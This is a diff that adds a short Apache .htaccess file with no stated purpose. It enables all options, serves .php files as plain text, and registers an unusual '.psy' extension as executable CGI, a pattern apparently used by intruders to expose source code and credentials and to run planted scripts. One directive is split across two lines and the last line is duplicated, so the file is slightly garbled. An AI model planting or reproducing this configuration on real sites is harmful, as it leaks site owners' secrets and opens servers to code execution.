@@ -1,0 +1,7 @@
+Options all
+Directory
+Index Sux.html
+AddType text/plain .php
+AddHandler server-parsed .php
+AddHandler cgi-script .psy
+AddHandler cgi-script .psy
